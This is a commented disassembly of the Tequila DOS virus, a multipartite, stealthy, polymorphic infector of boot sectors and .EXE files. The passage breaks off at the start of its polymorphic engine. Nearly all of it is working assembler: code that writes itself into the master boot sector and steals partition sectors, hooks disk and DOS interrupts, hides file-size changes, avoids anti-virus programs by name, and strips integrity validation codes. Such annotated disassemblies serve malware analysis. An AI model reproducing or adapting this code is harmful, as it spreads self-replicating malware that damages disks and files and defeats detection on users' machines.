; Tequila.2468.A (exact) disasm.
; Multipartite semi-stealth polymorphic MBS & .EXE-infector.
; Bugs marked with '***'.
; T-2000/IR, March 2000.

                .MODEL  TINY
                .STACK  512
                .CODE

Virus_Size      EQU     (End_Body-START)
Virus_Size_512  EQU     ((End_Body-START)+511)/512
Virus_Size_1024 EQU     ((End_Body-START)+1023)/1024
Virus_Size_Mem  EQU     ((End_Heap-START)+15)/16

START:

Host_IP         DW      OFFSET Carrier
Host_CS         DW      (256/16)
Host_SS         DW      (256/16)

Infect_Year     DW      0       ; Year of MBS infection.
Infect_MD       DW      0       ; Month & day of MBS infection.

Tunnel_Success  DB      0       ; DOS' INT 13h found boolean.

Word_16         DW      16      ; Used for MUL/DIV operations.
Word_512        DW      512
Word_250        DW      250
Byte_12         DB      12

Message         DB      0Dh, 0Ah, 0Dh, 0Ah
                DB      'Welcome to T.TEQUILA''s latest production.', 0Dh, 0Ah
                DB      'Contact T.TEQUILA/P.o.Box 543/6312 St''hausen/Switzerland.', 0Dh, 0Ah
                DB      'Loving thoughts to L.I.N.D.A', 0Dh, 0Ah, 0Dh, 0Ah
                DB      'BEER and TEQUILA forever !', 0Dh, 0Ah, 0Dh, 0Ah, '$'

Hint            DB      'Execute: mov ax, FE03 / int 21. Key to go on!'

; Tequila's activation routine, it's supposed to activate on the same day
; as the MBS infection took place, 3 or more months later, when it will
; draw a colorful mandelbrot set consisting out of ASCII characters, and
; display a message.

Check_Activate:
		PUSH	BP
                MOV     BP, SP

                SUB     SP, (6*2)               ; Reserve 12 bytes on the
                                                ; stack.
		PUSH	AX
		PUSH	BX
		PUSH	CX
		PUSH	DX
		PUSH	SI
		PUSH	DI
		PUSH	ES
		PUSH	DS

		PUSH	CS
		POP	DS

                MOV     AX, Infect_Year         ; Year of MBS infection.

                INC     AX                      ; Skip all further checks?
                JZ      JMP_Exit_Act            ; Yep.

                DEC     AX                      ; We're in countdown mode?
                JNZ     Check_Date              ; Nope.

                DEC     Infect_MD               ; 3 program exits so far?
                JNZ     JMP_Exit_Act            ; Else bug out.

                JMP     Init_Video_Seg          ; Do the effect.

Check_Date:     MOV     AH, 2Ah                 ; Get the current date.
                CALL    Do_Old_Int21h

                MOV     SI, CX                  ; SI = year count.

                MOV     CX, Infect_MD

                CMP     CL, DL                  ; Same day as infection?
                JNE     Disable_Check

                MOV     AX, SI                  ; AX = current year count.

                SUB     AX, Infect_Year         ; Minus the year count of
                                                ; MBS infection.

                MUL     Byte_12                 ; Calculate total count of
                                                ; months in year count.

                ADD     AL, DH                  ; Plus current month.
                                                ; AL = amount of months since
                                                ; MBS infection took place.

                ADD     CH, 3                   ; Infection date + 3 months.

                CMP     AL, CH                  ; 3 months have passed?
                JAE     Enable_Call             ; Then enable the payload.

Disable_Check:  MOV     Infect_Year, -1         ; Don't check the date
                JMP     JMP_Exit_Act            ; anymore.

Enable_Call:    MOV     Infect_Year, 0          ; Signal that the payload
                                                ; can activate and the 0FE03h
                                                ; call can be accepted.

                MOV     Infect_MD, 3            ; Countdown timer, wait 3
                                                ; program exits before
                                                ; activation.
JMP_Exit_Act:   JMP     Exit_Activate

Init_Video_Seg: MOV     BX, 0B800h              ; VGA video segment.

                INT     11h                     ; Get equipment status.

                AND     AX, 0000000000110000b   ; Mask out video state.

                CMP     AX, 0000000000110000b   ; 80x25 monochrome?
                JNE     Set_Video_Seg

                MOV     BX, 0B000h              ; Monochrome video segment.

Set_Video_Seg:  MOV     ES, BX

; I didn't bother commenting the effect as I don't have a clue of what the
; fuck it's doing. Besides, graphical payloads are for lamers anyways....

                XOR     BX, BX

                MOV     DI, 0FD8Fh

LOC_9:          MOV     SI, 0FC18h

LOC_10:         MOV     [BP-(1*2)], SI
                MOV     [BP-(2*2)], DI

                MOV     CX, 30

LOCLOOP_11:     MOV     AX,[BP-(1*2)]
		IMUL	AX			; dx:ax = reg * ax

                MOV     [BP-(4*2)], AX
                MOV     [BP-(3*2)], DX

                MOV     AX, [BP-(2*2)]
		IMUL	AX			; dx:ax = reg * ax

                MOV     [BP-(6*2)], AX
                MOV     [BP-(5*2)], DX

                ADD     AX, [BP-(4*2)]
                ADC     DX, [BP-(3*2)]

                CMP     DX, 15
                JAE     LOC_12

                MOV     AX, [BP-(1*2)]
                IMUL    WORD PTR [BP-(2*2)]   ; dx:ax = data * ax
                IDIV    Word_250       ; ax,dxrem=dx:ax/data

                ADD     AX, DI
                MOV     [BP-(2*2)], AX

                MOV     AX, [BP-(4*2)]
                MOV     DX, [BP-(3*2)]

                SUB     AX, [BP-(6*2)]
                SBB     DX, [BP-(5*2)]
                IDIV    Word_512

                ADD     AX, SI
                MOV     [BP-(1*2)], AX

                LOOP    LOCLOOP_11

LOC_12:         INC     CX
                SHR     CL, 1

                MOV     CH, CL
                MOV     CL, 0DBh
                MOV     ES:[BX], CX

		INC	BX
		INC	BX

                ADD     SI, 18

                CMP     SI, 1B8h
                JL      LOC_10

                ADD     DI, 52

                CMP     DI, 2A3h
                JL      LOC_9

                XOR     DI, DI                  ; Display the hint on screen.
                MOV     SI, OFFSET Hint
                MOV     CX, (Check_Activate-Hint)
                CLD

Write_Char:     MOVSB                           ; Put a byte in video RAM.
                INC     DI                      ; Don't change the attribute.

                LOOP    Write_Char              ; Do the entire string.

                XOR     AX, AX                  ; Wait for a keypress.
                INT     16h

Exit_Activate:  POP     DS
		POP	ES
		POP	DI
		POP	SI
		POP	DX
		POP	CX
		POP	BX
		POP	AX

                MOV     SP, BP
		POP	BP

		RETN


; This displays Tequila's message.
Display_Message:
		PUSH	DX
		PUSH	DS

		PUSH	CS
		POP	DS

                MOV     AH, 09h                 ; Display string.
                MOV     DX, OFFSET Message
                CALL    Do_Old_Int21h

		POP	DS
		POP	DX

		RETN


                ; This get's inserted into MBS'ses.
MBS_Loader:
                CLI

                XOR     BX, BX                  ; Zero DS.
                MOV     DS, BX

                MOV     SS, BX                  ; Setup a stack.
                MOV     SP, 7C00h

                STI

                XOR     DI, DI

                ; Steal 3k of DOS memory to go resident into.

                SUB     WORD PTR DS:[413h], Virus_Size_1024
                INT     12h

                MOV     CL, 6                   ; Calculate segment to go
                SHL     AX, CL                  ; resident into.

                MOV     ES, AX                  ; Push relocated address.
		PUSH	ES

                MOV     AX, OFFSET Relocated_Boot
		PUSH	AX

                ; Read the virusbody off disk.

                MOV     AX, 0200h+Virus_Size_512
                MOV     CX, DS:[7C00h+(Home_ST-MBS_Loader)]
		INC	CX
                MOV     DX, DS:[7C00h+(Home_HD-MBS_Loader)]
                INT     13h

                RETF                            ; Jump to the relocated code.

ID_Word         DW      0FE02h                  ; Already-infected-tag.

Home_ST         DW      0                       ; Sector/track of virusbody.
Home_HD         DW      0                       ; Head/drive of virusbody.

Relocated_Boot: PUSH    CS
                POP     DS

                XOR     AX, AX                  ; Zero ES.
                MOV     ES, AX

                MOV     BX, 7C00h

                PUSH    ES                      ; ES:BX = 0000:7C00, boot
                PUSH    BX                      ; address.

                MOV     AX, 0201h               ; Read the original MBS from
                MOV     CX, Home_ST             ; disk.
                MOV     DX, Home_HD
                INT     13h

                PUSH    CS
                POP     ES

                ; Create a copy of the INT 13h ISR, and the
                ; body encryptor & appender, as the virus will
                ; encrypt the runtime code when it infects a file
                ; so it doesn't have to use a seperate buffer.

                CLD
                MOV     SI, OFFSET New_Int13h
                MOV     DI, OFFSET New_Int13h_Copy
                MOV     CX, (New_Int1Ch-New_Int13h)
                REP     MOVSB

                MOV     SI, OFFSET Append_Body_Encrypted
                MOV     DI, OFFSET Append_Body_Encrypted_Copy
                MOV     CX, (Decryptor-Append_Body_Encrypted)
                REP     MOVSB

                CLI

                XOR     AX, AX                  ; ES = IVT.
                MOV     ES, AX

                LES     BX, ES:[(1Ch*4)]        ; Get INT 1Ch (timer).

                MOV     Old_Int1Ch, BX          ; Save INT 1Ch.
                MOV     Old_Int1Ch+2, ES

                MOV     ES, AX                  ; ES = IVT.

                LES     BX, ES:[(21h*4)]        ; Get INT 21h.

                MOV     Old_Int21h, BX          ; Save INT 21h aswell.
                MOV     Old_Int21h+2, ES

                MOV     ES, AX                  ; ES = IVT.

                ; Hook INT 1Ch.

                MOV     ES:[(1Ch*4)], OFFSET New_Int1Ch
                MOV     ES:[(1Ch*4)+2], DS

                STI

                RETF                            ; Jump to the original MBS.


                ; This is where the polymorphic decryptor jumps
                ; to after it's done decrypting the virusbody.

Init_Virus:
                CALL    Get_IP                  ; Calculate the virus'
Get_IP:         POP     SI                      ; delta offset in this CS.
                SUB     SI, OFFSET Get_IP

                PUSH    SI                      ; Save some needed registers.
		PUSH	AX
		PUSH	ES

		PUSH	CS
		POP	DS

                MOV     AX, ES                  ; AX = current PSP.

        ; Add the effective segment (PSP) to the segment values.

                ADD     [SI+(Host_CS-START)], AX
                ADD     [SI+(Host_SS-START)], AX

                DEC     AX                      ; Get the host's MCB in ES.
                MOV     ES, AX

                MOV     AX, 0FE02h              ; Virus' residency check.
                INT     21h

                CMP     AX, NOT 0FE02h          ; Virus is already installed?
                JE      Run_Host                ; Then just bail to the host.

                CMP     BYTE PTR ES:[0], 'Z'    ; Make sure this block is the
                JNE     Run_Host                ; last one in the chain, else
                                                ; higher blocks might get
                                                ; damaged.

                ; Make sure the memory block holds enough
                ; space to put the viruscode in.

                CMP     WORD PTR ES:[3], Virus_Size_Mem
                JBE     Run_Host

                MOV     AX, ES:[12h]            ; PSP:[2], holds TOM segment.
                SUB     AX, Virus_Size_Mem      ; Minus the virus' size to
                                                ; get the virus segment.

                MOV     ES, AX                  ; Virus segment.

                XOR     DI, DI                  ; Relocate the viruscode to
                MOV     CX, Virus_Size          ; the newly calculated
                CLD                             ; unused segment.
                REP     MOVSB

                PUSH    ES                      ; DS = virus segment.
		POP	DS

                CALL    Infect_MBS              ; Infect the 1st MBS.

Run_Host:       POP     ES                      ; Restore ES (PSP).
                POP     AX                      ; Restore AX (FCB status).

                PUSH    ES                      ; DS=ES=PSP.
		POP	DS

                POP     SI                      ; Restore virus delta offset.

                ; Restore the host's original SS.

                MOV     SS, CS:[SI+(Host_SS-START)]

                ; And jump to the host's original entrypoint.

                JMP     DWORD PTR CS:[SI+(Host_IP-START)]


Infect_MBS:
                MOV     AH, 2Ah                 ; Get the current date.
                INT     21h

                MOV     Infect_Year, CX         ; Store date of infection.
                MOV     Infect_MD, DX

                MOV     AH, 52h                 ; Get M$-DOS list of lists.
                INT     21h                     ; (undocumented).

                MOV     AX, ES:[BX-2]           ; Get segment of 1st MCB.
                MOV     First_MCB, AX           ; And save it for tunneler.

                MOV     AX, 3513h               ; Get INT 13h.
                INT     21h

                MOV     Old_Int13h, BX          ; Save INT 13h.
                MOV     Old_Int13h+2, ES

                MOV     AX, 3501h               ; Get INT 01h.
                INT     21h

                MOV     SI, BX                  ; Save INT 01h in DI:SI.
                MOV     DI, ES

                MOV     AX, 2501h               ; Put in the tunneler.
                MOV     DX, OFFSET New_Int01h
                INT     21h

                MOV     Tunnel_Success, 0       ; Initialize as 'not found'.

                PUSHF                           ; Set the trapflag (TF).
		POP	AX
                OR      AX, 100h
		PUSH	AX
                POPF

                MOV     AX, 0201h               ; Read the MBS of HD 1.
                MOV     BX, OFFSET Buffer
                MOV     CX, 1
                MOV     DX, 80h

		PUSH	DS
		POP	ES

                PUSHF                           ; Call INT 13h while tracing.
                CALL    DWORD PTR Old_Int13h

                PUSHF                           ; Disable the TF incase
                POP     AX                      ; INT 13h wasn't found.
                AND     AX, NOT 100h
		PUSH	AX
                POPF

                PUSHF

                MOV     AX, 2501h               ; Restore original INT 01h.
                MOV     DX, SI
                MOV     DS, DI
                INT     21h

                POPF                            ; Flags after the MBS read.
                JNC     Check_MBS               ; If error, then bail out.

                JMP     Exit_Inf_MBS

Check_MBS:      PUSH    ES                      ; ES = virus segment.
		POP	DS

                ; Check if the MBS is already infected.

                CMP     [BX+(ID_Word-MBS_Loader)], 0FE02h
                JNE     Find_DOS_Part

                JMP     Exit_Inf_MBS

                ; This locates a DOS partition.

Find_DOS_Part:  ADD     BX, 1BEh                ; BX = begin partition table.

                MOV     CX, 4                   ; Maximum of 4 partitions.

Scan_Partition: MOV     AL, [BX+4]              ; Get the partition's system
                                                ; indicator.

                CMP     AL, 4                   ; DOS 16-bit FAT ?
                JE      Store_Home

                CMP     AL, 6                   ; DOS > 32M ?
                JE      Store_Home

                CMP     AL, 1                   ; DOS 12-bit FAT ?
                JE      Store_Home

                ADD     BX, 16                  ; Next partition.

                LOOP    Scan_Partition          ; Loop to the next partition.

                JMP     Exit_Inf_MBS            ; None found.

Store_Home:     MOV     DL, 80h                 ; First harddisk.
                MOV     DH, [BX+5]              ; Last head of DOS partition.

                MOV     Home_HD, DX             ; Store virus' home
                                                ; drive & head.

                MOV     AX, [BX+6]              ; Last sector & track of
                                                ; DOS partition.
                MOV     CX, AX
                MOV     SI, Virus_Size_512+1    ; Virus sectors + old MBS.

                AND     AX, 0000000000111111b   ; Strip track count to get
                                                ; the last track sector.

                CMP     AX, SI                  ; There's enough space on
                JBE     Exit_Inf_MBS            ; this track for the virus?

                SUB     CX, SI                  ; Steal needed sectors from
                                                ; the partition's last track.
                MOV     DI, BX
		INC	CX
                MOV     Home_ST, CX

                MOV     AX, 0301h               ; Store the MBS on the stolen
                MOV     BX, OFFSET Buffer       ; partition sectors.

                PUSHF
                CALL    DWORD PTR Old_Int13h
                JC      Exit_Inf_MBS

                DEC     CX                      ; Adjust the DOS partition
                MOV     [DI+6], CX              ; to have 6 sectors less.

		INC	CX

                SUB     [DI+12], SI             ; Adjust the partition sector
                SBB     WORD PTR [DI+12+2], 0   ; count aswell.

                ; Write the virusbody to the stolen sectors.

                MOV     AX, 0300h+Virus_Size_512
                MOV     BX, 0
		INC	CX

                PUSHF                           ; INT 13h.
                CALL    DWORD PTR Old_Int13h
                JC      Exit_Inf_MBS

                ; Copy the virus MBS loader into the MBS.

                MOV     SI, OFFSET MBS_Loader
                MOV     DI, OFFSET Buffer
                MOV     CX, (Relocated_Boot-MBS_Loader)
                CLD
                REP     MOVSB

                MOV     AX, 0301h               ; Write the infected MBS
                MOV     BX, OFFSET Buffer       ; to disk.
                MOV     CX, 1
                XOR     DH, DH

                PUSHF                           ; INT 13h.
                CALL    DWORD PTR Old_Int13h

Exit_Inf_MBS:   RETN


New_Int01h:
                PUSH    BP                      ; Setup a stack pointer.
                MOV     BP, SP

                CMP     CS:Tunnel_Success, 1    ; Tunnel already finished?
                JE      Clear_TF                ; *** Pointless code, since
                                                ; the TF is already cleared.

                CMP     [BP+(2*2)], 1234h       ; We're in the DOS kernel?
First_MCB       =       WORD PTR $-2
                JA      Exit_Int01h

		PUSH	AX
		PUSH	ES

                LES     AX, [BP+(1*2)]          ; Get instruction's CS:IP.

                MOV     CS:Old_Int13h, AX       ; Save it.
                MOV     CS:Old_Int13h+2, ES

                MOV     CS:Tunnel_Success, 1    ; Mark tunnel successful.

		POP	ES
		POP	AX

Clear_TF:       AND     [BP+(3*2)], NOT 100h    ; Disable the trapflag.

Exit_Int01h:    POP     BP

                IRET


New_Int13h:
                CMP     CX, 1                   ; Track 0, sector 1 ?
                JNE     JMP_Old_Int13h

                CMP     DX, 80h                 ; Head 0, of the 1st HD ?
                JNE     JMP_Old_Int13h

                CMP     AH, 03h                 ; Is it a sector write?
                JA      JMP_Old_Int13h

                CMP     AH, 02h                 ; Or a sector read?
                JB      JMP_Old_Int13h

		PUSH	CX
		PUSH	DX

                DEC     AL                      ; Only the MBS gets read?
                JZ      Read_Orig_MBS

		PUSH	AX
		PUSH	BX

                ADD     BX, 512                 ; Next sector in buffer.
                INC     CX                      ; Next sector.

                PUSHF                           ; Process the other sectors
                CALL    DWORD PTR CS:Old_Int13h ; first, so the MBS action
                                                ; can be redirected to the
                                                ; clean one.
		POP	BX
		POP	AX

Read_Orig_MBS:  MOV     AL, 1                   ; Just the MBS.

                MOV     CX, CS:Home_ST          ; Load address of original
                MOV     DX, CS:Home_HD          ; MBS.

                PUSHF                           ; Read/write the original
                CALL    DWORD PTR CS:Old_Int13h ; MBS.

		POP	DX
		POP	CX

                RETF    2                       ; Return with flags.

JMP_Old_Int13h: JMP     DWORD PTR CS:Old_Int13h


New_Int1Ch:
		PUSH	AX
		PUSH	BX
		PUSH	ES
		PUSH	DS

                XOR     AX, AX                  ; ES = IVT.
                MOV     ES, AX

		PUSH	CS
		POP	DS

                LES     BX, ES:[(21h*4)]        ; Get INT 21h.

                MOV     AX, ES                  ; AX = segment of INT 21h.

                CMP     AX, 800h                ; Is it too high?
                JA      Exit_Int1Ch             ; Then assume DOS ain't
                                                ; loaded yet.

                CMP     AX, Old_Int21h+2        ; Has the DOS segment
                JNE     Save_Int21h             ; changed since boot-up?

                CMP     BX, Old_Int21h          ; Has the DOS offset changed
                JE      Exit_Int1Ch             ; since boot-up?

Save_Int21h:    MOV     Old_Int21h, BX          ; Save INT 21h.
                MOV     Old_Int21h+2, ES

                XOR     AX, AX                  ; DS = IVT.
                MOV     DS, AX

                LES     BX, DWORD PTR CS:Old_Int1Ch

                MOV     DS:[(1Ch*4)], BX        ; Restore original INT 1Ch.
                MOV     DS:[(1Ch*4)+2], ES

                LES     BX, DS:[(13h*4)]        ; Get INT 13h.

                MOV     CS:Old_Int13h, BX       ; Save INT 13h.
                MOV     CS:Old_Int13h+2, ES

                ; Hook INT 13h.

                MOV     DS:[(13h*4)], OFFSET New_Int13h_Copy
                MOV     DS:[(13h*4)+2], CS

                ; Hook INT 21h.

                MOV     DS:[(21h*4)], OFFSET New_Int21h
                MOV     DS:[(21h*4)+2], CS

Exit_Int1Ch:    POP     DS
		POP	ES
		POP	BX
		POP	AX

                IRET


New_Int21h:
                CMP     AH, 11h                 ; Findfirst (FCB) ?
                JB      Check_Dir_St

                CMP     AH, 12h                 ; Findnext (FCB) ?
                JA      Check_Dir_St

                CALL    FCB_Stealth             ; Carry-out the FCB stealth.

                RETF    2                       ; Return with flags.

Check_Dir_St:   CMP     AH, 4Eh                 ; Findfirst (dir) ?
                JB      Check_TSR_Test

                CMP     AH, 4Fh                 ; Findnext (dir) ?
                JA      Check_TSR_Test

                CALL    Dir_Stealth             ; Carry-out the dir stealth.

                RETF    2                       ; Return with flags.

Check_TSR_Test: CMP     AX, 0FE02h              ; Virus' residency check?
                JNE     Check_Message

                NOT     AX                      ; Return TSR mark.

                IRET                            ; Return to the caller.

Check_Message:  CMP     AX, 0FE03h              ; Call to display message?
                JNE     Check_Exec

                CMP     CS:Infect_Year, 0       ; The date was correct?
                JNZ     JMP_Old_Int21h          ; Else just ignore the call.

                CALL    Display_Message

                IRET

Check_Exec:     CMP     AX, 4B00h               ; Program execute?
                JE      Init_Stack

                CMP     AH, 4Ch                 ; Program terminate?
                JNE     JMP_Old_Int21h

Init_Stack:     MOV     CS:Old_SP, SP           ; Save the current stack.
                MOV     CS:Old_SS, SS

                CLI                             ; Setup own stack.
		PUSH	CS
		POP	SS
                MOV     SP, OFFSET Validate_Header+128
                STI

                CMP     AH, 4Ch                 ; Was it program terminate?
                JNE     Do_Infect_File

                CALL    Check_Activate

                JMP     Restore_Stack

Do_Infect_File: CALL    Infect_File

Restore_Stack:  CLI                             ; Restore the original stack.
                MOV     SS, CS:Old_SS
                MOV     SP, CS:Old_SP
                STI

                JMP     $+2                     ; *** Pointless instruction.

JMP_Old_Int21h: INC     CS:Int_Count            ; Update random counter.

                JMP     DWORD PTR CS:Old_Int21h


New_Int24h:
                MOV     AL, 03h                 ; Fail operation.
                IRET


FCB_Stealth:
		PUSH	BX
		PUSH	ES

		PUSH	AX

                MOV     AH, 2Fh                 ; Get current DTA.
                CALL    Do_Old_Int21h

		POP	AX

                PUSHF                           ; Execute the call.
                CALL    DWORD PTR CS:Old_Int21h

                PUSHF
		PUSH	AX

                CMP     AL, -1                  ; Error?
                JE      Exit_FCB_St             ; Then get out.

                CMP     ES:[BX.FCB_Drive], -1   ; Is it an extended FCB ?
                JNE     Get_FCB_Time

                ADD     BX, 7                   ; Then skip extended stuff.

Get_FCB_Time:   MOV     AL, BYTE PTR ES:[BX.FCB_Time]

                AND     AL, 00011111b           ; Mask-out seconds value.

                CMP     AL, (62/2)              ; File is infected?
                JNE     Exit_FCB_St

                ; Restore the original filesize.

                SUB     ES:[BX.FCB_Size], Virus_Size
                SBB     ES:[BX.FCB_Size+2], 0

Exit_FCB_St:    POP     AX
                POPF

		POP	ES
		POP	BX

		RETN


Dir_Stealth:
		PUSH	BX
		PUSH	ES

		PUSH	AX

                MOV     AH, 2Fh                 ; Get current DTA.
                CALL    Do_Old_Int21h

		POP	AX

                PUSHF                           ; Execute the call.
                CALL    DWORD PTR CS:Old_Int21h

                PUSHF
		PUSH	AX
                JC      Exit_Dir_St             ; Get out if error.

                MOV     AL, BYTE PTR ES:[BX.Dir_Time]

                AND     AL, 00011111b           ; Mask-out seconds value.

                CMP     AL, (62/2)              ; File is infected?
                JNE     Exit_Dir_St

                ; Restore original filesize.

                SUB     ES:[BX.Dir_Size], Virus_Size
                SBB     ES:[BX.Dir_Size+2], 0

Exit_Dir_St:    POP     AX
                POPF

		POP	ES
		POP	BX

		RETN


Write_File:
                MOV     AH, 40h                 ; Write to file.
                JMP     Do_Read_Write


Read_File:
                MOV     AH, 3Fh                 ; Read from file.
Do_Read_Write:  CALL    Load_BX_Int21h
                JC      Exit_Re_Wr              ; If error then exit with CF.

                SUB     AX, CX                  ; Set's CF if not all bytes
                                                ; were read.
Exit_Re_Wr:     RETN


Seek_EOF:
                XOR     CX, CX                  ; Seeks to end of file.
                XOR     DX, DX
Seek_EOF_Rel:   MOV     AX, 4202h               ; Seeks EOF relative.
                JMP     Load_BX_Int21h


Seek_BOF:
                XOR     CX, CX                  ; Seeks to begin of file.
                XOR     DX, DX
                MOV     AX, 4200h
Load_BX_Int21h: MOV     BX, CS:File_Handle      ; Load the filehandle.

Do_Old_Int21h:  CLI                             ; Do the DOS call.
                PUSHF
                CALL    DWORD PTR CS:Old_Int21h

		RETN


Infect_File:
		PUSH	AX
		PUSH	BX
		PUSH	CX
		PUSH	DX
		PUSH	SI
		PUSH	DI
		PUSH	ES
		PUSH	DS

                CALL    Check_File_Name         ; Filename can't contain 'SC'
                JNC     Init_Infect             ; or a 'V'.

                JMP     Exit_Infect

Init_Infect:    PUSH    DX
		PUSH	DS

		PUSH	CS
		POP	DS

                MOV     AX, 3524h               ; Get INT 24h.
                CALL    Do_Old_Int21h

                MOV     Old_Int24h, BX          ; Save it.
                MOV     Old_Int24h+2, ES

                MOV     AX, 2524h               ; Install own INT 24h.
                MOV     DX, OFFSET New_Int24h
                CALL    Do_Old_Int21h

                POP     DS                      ; File path.
		POP	DX

                MOV     AX, 4300h               ; Get file's attributes.
                CALL    Do_Old_Int21h

                MOV     CS:Old_Attr, CX         ; Save attributes.

                JNC     Blank_Attr

                DB      0E9h, 7Eh, 0

                ; * JMP Restore_Int24h *

Blank_Attr:     MOV     AX, 4301h               ; Blank file attributes.
                XOR     CX, CX
                CALL    Do_Old_Int21h
                JC      Restore_Int24h

                MOV     AX, 3D02h               ; Open the file read/write.
                CALL    Do_Old_Int21h
                JC      Restore_Attr

		PUSH	DX
		PUSH	DS

		PUSH	CS
		POP	DS

                MOV     File_Handle, AX         ; Save the filehandle.

                MOV     AX, 5700h               ; Get file's date & time.
                CALL    Load_BX_Int21h
                JC      Restore_Date

                MOV     Old_File_Date, DX       ; Save them.
                MOV     Old_File_Time, CX

                CALL    Seek_BOF                ; Seek to the start of the
                                                ; file. *** file pointer is
                                                ; already at BOF.

                MOV     DX, OFFSET Header       ; Read the file's header.
                MOV     CX, 28                  ; *** Reading in more than
                CALL    Read_File               ; needed.
                JC      Restore_Date

		PUSH	DS
		POP	ES

                MOV     DI, OFFSET Check_Activate
                MOV     CX, 32

                CMP     Header.EXE_ID, 'ZM'     ; It's an .EXE-file?
                JNE     Restore_Date            ; If not, abort infect.

                MOV     AX, Header.Checksum     ; See if the checksum matches
                CLD                             ; a semi-random word in the
                REPNE   SCASW                   ; viruscode.
                JNE     Check_Validate

                OR      Old_File_Time, (62/2)   ; *** Infected files already
                                                ; have 62 seconds.
                JMP     Restore_Date

Check_Validate: CALL    Remove_Validate         ; Remove McAfee validation
                JC      Restore_Date            ; shit.

                CALL    Add_Virus               ; Add the virus to the file.

Restore_Date:   MOV     AX, 5701h               ; Restore file's date & time.
                MOV     DX, Old_File_Date
                MOV     CX, Old_File_Time
                CALL    Load_BX_Int21h

                MOV     AH, 3Eh                 ; Close the file.
                CALL    Load_BX_Int21h

                POP     DS                      ; File path.
		POP	DX

Restore_Attr:   MOV     AX, 4301h               ; Restore file's original
                MOV     CX, CS:Old_Attr         ; attributes.
                CALL    Do_Old_Int21h

Restore_Int24h: MOV     AX, 2524h               ; Restore original INT 24h.
                LDS     DX, DWORD PTR CS:Old_Int24h
                CALL    Do_Old_Int21h

Exit_Infect:    POP     DS
		POP	ES
		POP	DI
		POP	SI
		POP	DX
		POP	CX
		POP	BX
		POP	AX

		RETN


; Returns CF when the filename holds 'SC' or a 'V', this includes most
; anti-virus programs, SCAN, TBSCAN, VIRSCAN, CPAV, NAV, IBMAV, etc.
Check_File_Name:
		PUSH	DS
		POP	ES

                MOV     DI, DX                  ; Find the end of the string.
                MOV     CX, -1
                XOR     AL, AL
                CLD
                REPNE   SCASB

                NOT     CX                      ; CX = length of entire path.

                MOV     DI, DX

                MOV     AX, 'CS'                ; 'SC'.

                MOV     SI, CX

Find_SCan:      SCASW                           ; Found 'SC' ?
                JE      Bad_File_Name           ; Then bail.

                DEC     DI                      ; We're doing bytes.

                LOOP    Find_SCan

                MOV     CX, SI                  ; Search for a 'V'.
                MOV     DI, DX
                MOV     AL, 'V'
                REPNE   SCASB
                JE      Bad_File_Name

                ; *** It would have been better if only the filename
                ; was searched instead of the entire path.

Good_File_Name: CLC                             ; Filename is OK.

		RETN

Bad_File_Name:  STC                             ; Filename ain't OK!

		RETN


; Removes a possible McAfee validation code from the file.
Remove_Validate:
                MOV     CX, -1                  ; Seek to the last 10 bytes.
                MOV     DX, -10
                CALL    Seek_EOF_Rel

                MOV     DX, OFFSET Validate_Header      ; Read 8 from there.
                MOV     CX, 8
                CALL    Read_File
                JC      Exit_Remove_Va

                CMP     Validate_Header, 0FDF0h ; Check for the signature.
                JNE     Not_Protected

                CMP     Validate_Header+2, 0AAC5h
                JNE     Not_Protected

                MOV     CX, -1                  ; Seek to the last 9 bytes.
                MOV     DX, -9
                CALL    Seek_EOF_Rel

                ; Trash signature.

                MOV     DX, OFFSET Validate_Header+6
                MOV     CX, 4
                CALL    Write_File

Exit_Remove_Va: RETN

Not_Protected:  CLC

		RETN


Add_Virus:
                CALL    Seek_EOF

                MOV     SI, AX                  ; DI:SI = old filesize.
                MOV     DI, DX

                MOV     BX, OFFSET Header

                MOV     AX, [BX.File_512_Pages] ; Calculate 512-byte pages
                MUL     Word_512                ; of the file.

                SUB     AX, SI                  ; Physical size exceeds image
                SBB     DX, DI                  ; size? Then it's usually an
                JNC     Calc_Hdr_Size           ; overlay, so bug out.

                JMP     Exit_Add_Virus

Calc_Hdr_Size:  MOV     AX, [BX.Header_Size]    ; Calculate headersize.
                MUL     Word_16

                SUB     SI, AX                  ; DI:SI = imagesize.
                SBB     DI, DX

                MOV     AX, [BX.Program_SS]     ; Save file's original SS.
                MOV     Host_SS, AX
                ADD     Host_SS, (256/16)       ; Add PSP size.

                MUL     Word_16                 ; DX:AX = SS in bytes.

                ADD     AX, [BX.Program_SP]     ; Plus SP value.
                                                ; *** Missing a ADC DX, 0.

                SUB     AX, SI                  ; Stack points inside the
                SBB     DX, DI                  ; program image?
                JC      Save_CS

                SUB     AX, 128                 ; Original program must have
                SBB     DX, 0                   ; atleast 128 bytes of stack.
                JC      Exit_Add_Virus          ; Else get out.

                ; Adjust the stack so the viruscode
                ; doesn't get overwritten.

                ADD     [BX.Program_SS], (Virus_Size+15)/16

Save_CS:        MOV     AX, [BX.Program_CS]     ; Old CS.
                ADD     AX, (256/16)            ; Add size of PSP.

                MOV     Host_CS, AX             ; Save CS.

                MOV     AX, [BX.Program_IP]     ; Save IP.
                MOV     Host_IP, AX

                CALL    Seek_EOF

                ADD     AX, Virus_Size          ; Calculate size after
                ADC     DX, 0                   ; infection.

                DIV     Word_512                ; Calculate imagesize.

                INC     AX                      ; Round upwards.

                ; Set new imagesize.

                MOV     Header.File_512_Pages, AX
                MOV     Header.Image_Mod_512, DX

                MOV     DX, DI                  ; DI:SI = old imagesize.
                MOV     AX, SI
                DIV     Word_16                 ; Calculate new CS:IP.

                MOV     Header.Program_CS, AX   ; Set new CS.

                MOV     BX, DX                  ; BX = new IP.

                ADD     DX, OFFSET Decryptor    ; Set new IP.
                MOV     Header.Program_IP, DX

                CALL    Poly_Engine             ; Add a polymorphic virus
                JC      Exit_Add_Virus          ; copy to the host.

                OR      Old_File_Time, (62/2)   ; Mark the file as infected
                                                ; by setting the second value
                                                ; to an invalid setting.

                MOV     BX, Int_Count           ; Random counter.
                AND     BX, 00011111b           ; 0 - 31.
                SHL     BX, 1                   ; MUL 2 (for word index).

                ; Put a semi-random word from the viruscode in the
                ; header's checksum field to mark the infection.

                MOV     AX, [(Check_Activate-START)+BX]
                MOV     Header.Checksum, AX

                CALL    Seek_BOF

                MOV     CX, 28                  ; Write the updated header
                MOV     DX, OFFSET Header       ; to the target.
                CALL    Write_File

Exit_Add_Virus: RETN


; The decryptors being generated are quite simple, they are effectively
; enough against pure signature scanners, though can be found with a simple
; algorithmic approach. A pecularity is that the decryptors use themselves
; as a key, which drastically complicates debugging.

Poly_Engine:
		PUSH	BP

                XOR     AH, AH                  ; Get BIOS tick count.
                INT     1Ah

                MOV     AX, DX
